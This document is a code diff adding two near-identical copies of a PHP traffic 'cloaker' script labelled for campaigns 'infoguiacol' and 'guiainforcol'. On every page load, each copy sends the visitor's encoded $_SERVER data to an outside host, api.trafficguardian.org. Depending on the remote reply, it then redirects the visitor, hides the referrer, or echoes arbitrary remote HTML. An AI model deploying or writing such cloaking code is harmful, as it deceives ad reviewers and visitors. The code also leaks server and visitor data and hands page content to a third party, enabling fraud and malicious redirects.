@@ -1,0 +1,644 @@
+<?php
+class clLogic
+{
+    private string $apiEndpoint;
+    private int $responseTimeout = 20;
+    private int $connectTimeout = 20;
+    private array $httpHeaders = [];
+    private string $encodedServerData;
+    private ?string $userIdentifier = "jMcUkVGjPE";
+    private ?string $campaignIdentifier = "N67sLbxuAv";
+    private bool $isDebugMode = false;
+
+    private const DEBUG_QUERY_PARAM = 'Vf5e78hgfhd';
+    private const DEBUG_CAMPAIGN_PARAM = '4f5e78hgfhd';
+    private const RESPONSE_TYPE_REDIRECT = 'redirection';
+    private const RESPONSE_TYPE_INLINE = 'nrc';
+
+    public function start()
+    {
+        try {
+            ini_set('display_errors', 1);
+            ini_set('display_startup_errors', 1);
+            error_reporting(E_ALL);
+
+            $this->checkRequirements();
+            $this->handleCidQueryParam();
+            $this->bootstrapExecution();
+        } catch (Throwable $e) {
+            $this->handleException($e);
+        }
+    }
+
+    private function checkRequirements(): void
+    {
+        try {
+            if (version_compare(PHP_VERSION, '7.4', '<')) {
+                throw new RuntimeException('!Error: PHP 7.4 or higher is required. Current version: ' . PHP_VERSION);
+            }
+
+            if (!extension_loaded('curl')) {
+                throw new RuntimeException('!Error: cURL extension is not enabled.');
+            }
+        } catch (Throwable $e) {
+            $this->handleException($e);
+        }
+    }
+
+    private function handleCidQueryParam(): void
+    {
+        try {
+            if (!isset($_GET[self::DEBUG_CAMPAIGN_PARAM])) {
+                return;
+            }
+
+            header('Content-Type: text/plain');
+            echo $this->campaignIdentifier ?? 'cid-not-found';
+            exit;
+        } catch (Throwable $e) {
+            $this->handleException($e);
+        }
+    }
+
+    private function bootstrapExecution(): void
+    {
+        try {
+            $this->setApiEndpoint();
+            $this->initializeDebugMode();
+            $this->encodeServerEnvironment();
+            $this->prepareHttpHeaders();
+            $this->sendRequestAndHandle();
+        } catch (Throwable $e) {
+            $this->handleException($e);
+        }
+    }
+
+    private function initializeDebugMode(): void
+    {
+        try {
+            $this->isDebugMode = isset($_GET[self::DEBUG_QUERY_PARAM]);
+        } catch (Throwable $e) {
+            $this->handleException($e);
+        }
+    }
+
+    private function encodeServerEnvironment(): void
+    {
+        try {
+            $this->encodedServerData = base64_encode(json_encode($_SERVER));
+        } catch (Throwable $e) {
+            $this->handleException($e);
+        }
+    }
+
+    private function prepareHttpHeaders(): void
+    {
+        try {
+            $this->httpHeaders = [
+                sprintf('Content-Type: %s', 'application/json'),
+                'Accept: application/json',
+                'User-Agent: CloakBot/1.0',
+                'X-Timestamp: ' . gmdate('c'),
+                'Connection: keep-alive',
+                'X-UID: ' . ($this->userIdentifier ?? 'null'),
+                'X-CID: ' . ($this->campaignIdentifier ?? 'null'),
+            ];
+        } catch (Throwable $e) {
+            $this->handleException($e);
+        }
+    }
+
+    public function sendRequestAndHandle(): array
+    {
+        try {
+            $payload = $this->generateRequestPayload();
+            $attempts = 0;
+            $maxRetries = 5;
+            $response = null;
+            $httpCode = 0;
+            $curlError = null;
+
+            do {
+                $attempts++;
+
+                $ch = curl_init($this->apiEndpoint);
+                curl_setopt_array($ch, $this->configureCurlOptions($payload));
+
+                $rawResponse = curl_exec($ch);
+
+                $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+                $curlError = curl_error($ch);
+                curl_close($ch);
+
+                $response = $this->parseJsonResponse($rawResponse);
+
+                $shouldRetry = !empty($curlError) || $httpCode < 200 || $httpCode >= 300;
+
+                if (!$shouldRetry) {
+                    break;
+                }
+
+            } while ($attempts < $maxRetries);
+
+            $result = $this->buildFormattedResponse($payload, $httpCode, $curlError, $response);
+
+            if ($this->isDebugMode) {
+                $this->dumpDebugTrace($result);
+            }
+
+            $this->processServerDirective($response);
+
+            return $result;
+        } catch (Throwable $e) {
+            $this->handleException($e);
+            return ['error' => $e->getMessage()];
+        }
+    }
+
+    private function generateRequestPayload(): array
+    {
+        try {
+            return [
+                'uid'     => $this->userIdentifier,
+                'cid'     => $this->campaignIdentifier,
+                'payload' => $this->encodedServerData,
+            ];
+        } catch (Throwable $e) {
+            $this->handleException($e);
+            return [];
+        }
+    }
+
+    private function configureCurlOptions(array $payload): array
+    {
+        try {
+            return [
+                CURLOPT_RETURNTRANSFER => true,
+                CURLOPT_POST           => true,
+                CURLOPT_HTTPHEADER     => $this->httpHeaders,
+                CURLOPT_POSTFIELDS     => json_encode($payload),
+                CURLOPT_TIMEOUT        => $this->responseTimeout,
+                CURLOPT_CONNECTTIMEOUT => $this->connectTimeout,
+                CURLOPT_SSL_VERIFYPEER => true,
+            ];
+        } catch (Throwable $e) {
+            $this->handleException($e);
+            return [];
+        }
+    }
+
+    private function parseJsonResponse($raw): ?array
+    {
+        try {
+            $decoded = json_decode($raw, true);
+            return is_array($decoded) ? $decoded : null;
+        } catch (Throwable $e) {
+            $this->handleException($e);
+            return null;
+        }
+    }
+
+    private function buildFormattedResponse(array $payload, int $httpCode, string $error, ?array $response): array
+    {
+        try {
+            return [
+                'http_code' => $httpCode,
+                'curl_error' => $error,
+                'request_payload' => $payload,
+                'response' => $response,
+            ];
+        } catch (Throwable $e) {
+            $this->handleException($e);
+            return [];
+        }
+    }
+
+   private function processServerDirective(?array $response): void
+    {
+        try {
+            if ($response['status'] == 'error') {
+                echo $response['message'] ?? 'Unknown error';
+                exit;
+            }
+            if ($response['status'] == 'none') {
+                return;
+            }
+
+            if (isset($response['hide_referrer']) && $response['hide_referrer'] == 1) {
+                header("Referrer-Policy: no-referrer");
+            }
+            if (isset($response['hide_referrer']) && $response['hide_referrer'] == 2) {
+               echo '<!DOCTYPE html>
+                    <html lang="en">
+                    <head>
+                        <meta charset="UTF-8">
+                        <title>Redirecting...</title>
+                        <script>
+                            window.onload = function() {
+                                var url = "' . ($response['url'] ?? '') . '";
+                                if (url) {
+                                    location.replace(url);
+                                } else {
+                                    document.body.innerText = "Invalid redirect URL.";
+                                }
+                            };
+                        </script>
+                    </head>
+                    <body>
+                        Redirecting...<br>
+                        <noscript>
+                            JavaScript is disabled. <a href="<?php echo htmlspecialchars($url, ENT_QUOTES); ?>">Click here to continue.</a>
+                        </noscript>
+                    </body>
+                    </html>
+                    ';
+               exit;
+            }
+
+            switch ($response['method'] ?? '') {
+                case self::RESPONSE_TYPE_REDIRECT:
+                    header('Location: ' . $response['url'], false, (int) ($response['http_code'] ?? 302));
+                    exit;
+
+                case self::RESPONSE_TYPE_INLINE:
+                    echo $response['content'] ?? '';
+                    exit;
+            }
+        } catch (Throwable $e) {
+            $this->handleException($e);
+        }
+    }
+    public function dumpDebugTrace(array $data = []): void
+    {
+        try {
+            echo "<pre>";
+            echo "=========== TRACE INFO ===========";
+            echo "Endpoint: {$this->apiEndpoint}";
+            echo "--- Headers ---";
+            print_r($this->httpHeaders);
+            echo "--- Payload ---";
+            print_r([
+                'uid' => $this->userIdentifier,
+                'cid' => $this->campaignIdentifier,
+                'serverData' => $this->encodedServerData,
+            ]);
+            echo "--- Response ---";
+            print_r($data);
+            echo "==================================";
+            echo "</pre>";
+            exit;
+        } catch (Throwable $e) {
+            $this->handleException($e);
+        }
+    }
+
+    public function setApiEndpoint(): void
+    {
+        try {
+            $this->apiEndpoint = 'https://api.trafficguardian.org/api/v1/run';
+        } catch (Throwable $e) {
+            $this->handleException($e);
+        }
+    }
+
+    private function handleException(Throwable $e): void
+    {
+        http_response_code(500);
+        if ($this->isDebugMode) {
+            echo "<pre>ERROR: " . $e->getMessage() . "" . $e->getTraceAsString() . "</pre>";
+        } else {
+            echo "A system error occurred.";
+        }
+        exit;
+    }
+}
+
+$cloak = new clLogic();
+$cloak->start();
+?> cloaker de infoguiacol
+
+
+
+cloaker guiainforcol
+
+<?php
+class clLogic
+{
+    private string $apiEndpoint;
+    private int $responseTimeout = 20;
+    private int $connectTimeout = 20;
+    private array $httpHeaders = [];
+    private string $encodedServerData;
+    private ?string $userIdentifier = "jMcUkVGjPE";
+    private ?string $campaignIdentifier = "OqYnVxCPu0";
+    private bool $isDebugMode = false;
+
+    private const DEBUG_QUERY_PARAM = 'Vf5e78hgfhd';
+    private const DEBUG_CAMPAIGN_PARAM = '4f5e78hgfhd';
+    private const RESPONSE_TYPE_REDIRECT = 'redirection';
+    private const RESPONSE_TYPE_INLINE = 'nrc';
+
+    public function start()
+    {
+        try {
+            ini_set('display_errors', 1);
+            ini_set('display_startup_errors', 1);
+            error_reporting(E_ALL);
+
+            $this->checkRequirements();
+            $this->handleCidQueryParam();
+            $this->bootstrapExecution();
+        } catch (Throwable $e) {
+            $this->handleException($e);
+        }
+    }
+
+    private function checkRequirements(): void
+    {
+        try {
+            if (version_compare(PHP_VERSION, '7.4', '<')) {
+                throw new RuntimeException('!Error: PHP 7.4 or higher is required. Current version: ' . PHP_VERSION);
+            }
+
+            if (!extension_loaded('curl')) {
+                throw new RuntimeException('!Error: cURL extension is not enabled.');
+            }
+        } catch (Throwable $e) {
+            $this->handleException($e);
+        }
+    }
+
+    private function handleCidQueryParam(): void
+    {
+        try {
+            if (!isset($_GET[self::DEBUG_CAMPAIGN_PARAM])) {
+                return;
+            }
+
+            header('Content-Type: text/plain');
+            echo $this->campaignIdentifier ?? 'cid-not-found';
+            exit;
+        } catch (Throwable $e) {
+            $this->handleException($e);
+        }
+    }
+
+    private function bootstrapExecution(): void
+    {
+        try {
+            $this->setApiEndpoint();
+            $this->initializeDebugMode();
+            $this->encodeServerEnvironment();
+            $this->prepareHttpHeaders();
+            $this->sendRequestAndHandle();
+        } catch (Throwable $e) {
+            $this->handleException($e);
+        }
+    }
+
+    private function initializeDebugMode(): void
+    {
+        try {
+            $this->isDebugMode = isset($_GET[self::DEBUG_QUERY_PARAM]);
+        } catch (Throwable $e) {
+            $this->handleException($e);
+        }
+    }
+
+    private function encodeServerEnvironment(): void
+    {
+        try {
+            $this->encodedServerData = base64_encode(json_encode($_SERVER));
+        } catch (Throwable $e) {
+            $this->handleException($e);
+        }
+    }
+
+    private function prepareHttpHeaders(): void
+    {
+        try {
+            $this->httpHeaders = [
+                sprintf('Content-Type: %s', 'application/json'),
+                'Accept: application/json',
+                'User-Agent: CloakBot/1.0', 
+                'X-Timestamp: ' . gmdate('c'),
+                'Connection: keep-alive',
+                'X-UID: ' . ($this->userIdentifier ?? 'null'),
+                'X-CID: ' . ($this->campaignIdentifier ?? 'null'),
+            ];
+        } catch (Throwable $e) {
+            $this->handleException($e);
+        }
+    }
+
+    public function sendRequestAndHandle(): array
+    {
+        try {
+
+
+        $payload = $this->generateRequestPayload();
+        $attempts = 0;
+        $maxRetries = 5;
+        $response = null;
+        $httpCode = 0;
+        $curlError = null;
+
+        do {
+            $attempts++;
+
+            $ch = curl_init($this->apiEndpoint);
+            curl_setopt_array($ch, $this->configureCurlOptions($payload));
+
+            $rawResponse = curl_exec($ch);
+         
+            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+            $curlError = curl_error($ch);
+            curl_close($ch);
+
+            $response = $this->parseJsonResponse($rawResponse);
+
+            $shouldRetry = !empty($curlError) || $httpCode < 200 || $httpCode >= 300;
+
+            if (!$shouldRetry) {
+                break;
+            }
+
+        } while ($attempts < $maxRetries);
+
+            $result = $this->buildFormattedResponse($payload, $httpCode, $curlError, $response);
+
+
+            if ($this->isDebugMode) {
+                $this->dumpDebugTrace($result);
+            }
+
+            $this->processServerDirective($response);
+
+            return $result;
+        } catch (Throwable $e) {
+            $this->handleException($e);
+            return ['error' => $e->getMessage()];
+        }
+    }
+
+    private function generateRequestPayload(): array
+    {
+        try {
+            return [
+                'uid'     => $this->userIdentifier,
+                'cid'     => $this->campaignIdentifier,
+                'payload' => $this->encodedServerData,
+            ];
+        } catch (Throwable $e) {
+            $this->handleException($e);
+            return [];
+        }
+    }
+
+    private function configureCurlOptions(array $payload): array
+    {
+        try {
+            return [
+                CURLOPT_RETURNTRANSFER => true,
+                CURLOPT_POST           => true,
+                CURLOPT_HTTPHEADER     => $this->httpHeaders,
+                CURLOPT_POSTFIELDS     => json_encode($payload),
+                CURLOPT_TIMEOUT        => $this->responseTimeout,
+                CURLOPT_CONNECTTIMEOUT => $this->connectTimeout,
+                CURLOPT_SSL_VERIFYPEER => true,
+            ];
+        } catch (Throwable $e) {
+            $this->handleException($e);
+            return [];
+        }
+    }
+
+    private function parseJsonResponse($raw): ?array
+    {
+        try {
+            $decoded = json_decode($raw, true);
+            return is_array($decoded) ? $decoded : null;
+        } catch (Throwable $e) {
+            $this->handleException($e);
+            return null;
+        }
+    }
+
+    private function buildFormattedResponse(array $payload, int $httpCode, string $error, ?array $response): array
+    {
+        try {
+            return [
+                'http_code' => $httpCode,
+                'curl_error' => $error,
+                'request_payload' => $payload,
+                'response' => $response,
+            ];
+        } catch (Throwable $e) {
+            $this->handleException($e);
+            return [];
+        }
+    }
+
+   private function processServerDirective(?array $response): void
+    {
+        try {
+
+            if ($response['status'] == 'error') {
+                echo $response['message'] ?? 'Unknown error';
+                exit;
+            }
+            if ($response['status'] == 'none') {
+                return;
+            }
+
+            if (isset($response['hide_referrer']) && $response['hide_referrer'] == 1) {
+                header("Referrer-Policy: no-referrer");
+            }
+            if (isset($response['hide_referrer']) && $response['hide_referrer'] == 2) {
+               echo '<!DOCTYPE html>
+                    <html lang="en">
+                    <head>
+                        <meta charset="UTF-8">
+                        <title>Redirecting...</title>
+                        <script>
+                            window.onload = function() {
+                                var url = "' . ($response['url'] ?? '') . '";
+                                if (url) {
+                                    location.replace(url);
+                                } else {
+                                    document.body.innerText = "Invalid redirect URL.";
+                                }
+                            };
+                        </script>
+                    </head>
+                    <body>
+                        Redirecting...<br>
+                        <noscript>
+                            JavaScript is disabled. <a href="<?php echo htmlspecialchars($url, ENT_QUOTES); ?>">Click here to continue.</a>
+                        </noscript>
+                    </body>
+                    </html>
+                    ';
+               exit;
+            }
+
+            switch ($response['method'] ?? '') {
+                case self::RESPONSE_TYPE_REDIRECT:
+                    header('Location: ' . $response['url'], false, (int) ($response['http_code'] ?? 302));
+                    exit;
+
+                case self::RESPONSE_TYPE_INLINE:
+                    echo $response['content'] ?? '';
+                    exit;
+            }
+        } catch (Throwable $e) {
+            $this->handleException($e);
+        }
+    }
+    public function dumpDebugTrace(array $data = []): void
+    {
+        try {
+            echo "<pre>";
+            echo "=========== TRACE INFO ===========";
+            echo "Endpoint: {$this->apiEndpoint}";
+            echo "--- Headers ---";
+            print_r($this->httpHeaders);
+            echo "--- Payload ---";
+            print_r([
+                'uid' => $this->userIdentifier,
+                'cid' => $this->campaignIdentifier,
+                'serverData' => $this->encodedServerData,
+            ]);
+            echo "--- Response ---";
+            print_r($data);
+            echo "==================================";
+            echo "</pre>";
+            exit;
+        } catch (Throwable $e) {
+            $this->handleException($e);
+        }
+    }
+
+    public function setApiEndpoint(): void
+    {
+        try {
+            $this->apiEndpoint = 'https://api.trafficguardian.org/api/v1/run';
+        } catch (Throwable $e) {
+            $this->handleException($e);
+        }
+    }
+
+    private function handleException(Throwable $e): void
+    {
+        http_response_code(500);
+        if ($this->isDebugMode) {
+            echo "<pre>ERROR: " . $e->getMessage() . "" . $e->getTraceAsString() . "</pre>";
+        } else {
+            echo "A system error occurred.";
+        }
+        exit;
+    }
+}
+
+$cloak = new clLogic();
+$cloak->start();
